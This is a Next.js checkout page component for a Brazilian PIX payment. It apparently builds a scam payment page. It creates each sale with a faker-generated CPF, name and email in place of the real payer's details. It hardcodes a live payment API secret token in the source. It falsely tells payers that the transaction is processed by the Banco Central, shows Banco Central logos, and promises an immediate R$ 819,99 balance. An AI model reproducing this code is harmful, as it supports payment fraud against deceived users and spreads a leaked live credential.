import Image from "next/image";
import { QrCode } from "./qrcode";
import BC from '@/assets/bc.png'
import { createPaymentPixElitePay } from "@/http/create-sale";
import { gerarPessoa } from "@/lib/faker";
import { ButtonCopy } from "./button-copy";
import Logo from '@/assets/pix-banco-central.svg'
import { redirect } from "next/navigation";
import { CHECKOUT_URL } from "@/functions/urls";
import { CreditCard } from "lucide-react";
import { ButtonCheckout } from "./button-checkout";

export default async function CheckoutPage() {

  const { cpf, email, nome } = gerarPessoa()

  const result = await createPaymentPixElitePay({
    clientEmail: email,
    clientName: nome,
    clientDocument: cpf,
    token: 'sk_live_kcT1egH95AM7egAd645YdEwbMwmtH2NJkcFKZe5M2X'
  })

  if (!result.ok) {

    return (
      <>
        {JSON.stringify(result)}
      </>
    )



    //redirect(CHECKOUT_URL)
  }




  return (
    <div className="w-full relative flex items-center justify-center min-h-screen text-white p-5">
      <div className='w-full rounded-lg p-5 space-y-8'>
        <h2 className="text-3xl font-semibold text-black">Pague com PIX</h2>
        <p className="text-sm text-black">Escaneie o código QR abaixo ou copie o código PIX no seu app de pagamento. E receba seu saldo de <span className="font-bold">R$ 819,99</span> imediatamente em sua conta.</p>


        <QrCode brCode={result.pix.qrcode} />

        <div className="w-full flex flex-col items-center justify-center rounded-lg bg-white shadow-lg py-8 px-5 space-y-6">


          <Image src={Logo} width={80} height={20} alt="image" priority />


          <div className="mx-auto w-full border-2 border-black max-w-sm rounded-3xl overflow-hidden p-2">
            <p className="whitespace-nowrap text-center text-black overflow-hidden">
              {result.pix.qrcode}
            </p>
          </div>


          <ButtonCopy len={result.pix.qrcode} />


        </div>

        <div className="w-full flex flex-col items-center justify-center rounded-lg bg-white shadow-lg py-8 px-5 space-y-6">


          <p className="text-black text-sm">Ou pagar com cartão</p>

          <ButtonCheckout />

        </div>


        <p className="text-center text-xs text-black">Essa é uma transação segura, criptografada e processada pelo Banco Central.</p>



        <div className="flex items-center justify-center flex-col pt-16 select-none space-y-1">
          <p className="text-sm text-white">
            Segurança pelo:
          </p>

          <Image src={BC} alt="bc" width={0} height={0} className="w-[200px] h-auto" />
        </div>
      </div>
    </div>
  )
}